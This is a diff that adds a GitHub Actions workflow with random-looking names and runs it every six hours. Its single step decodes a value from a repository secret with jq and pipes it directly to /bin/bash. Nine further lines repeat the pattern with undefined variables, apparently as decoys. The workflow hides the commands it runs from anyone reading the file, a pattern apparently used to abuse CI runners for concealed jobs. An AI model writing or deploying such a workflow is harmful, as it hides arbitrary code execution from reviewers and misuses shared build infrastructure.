@@ -1,0 +1,27 @@
+name: zhaorushou6543
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaorushou6543
+        env:
+          fd0091: ${{ secrets.fd0091 }}
+        run: |
+          echo $fd0091 | jq -r .ugqhe334 | /bin/bash
+          echo $ukqp02 | jq -r .ynr555 | /bin/bash
+          echo $fbe93 | jq -r .cfpsg9815 | /bin/bash
+          echo $yc80016 | jq -r .btisv509 | /bin/bash
+          echo $o07 | jq -r .tjlad396 | /bin/bash
+          echo $clij0 | jq -r .eu26874 | /bin/bash
+          echo $unrmu9924 | jq -r .qig97649 | /bin/bash
+          echo $t37 | jq -r .eqqc64290 | /bin/bash
+          echo $a884 | jq -r .obs164 | /bin/bash
+          echo $f2 | jq -r .h90937 | /bin/bash
+
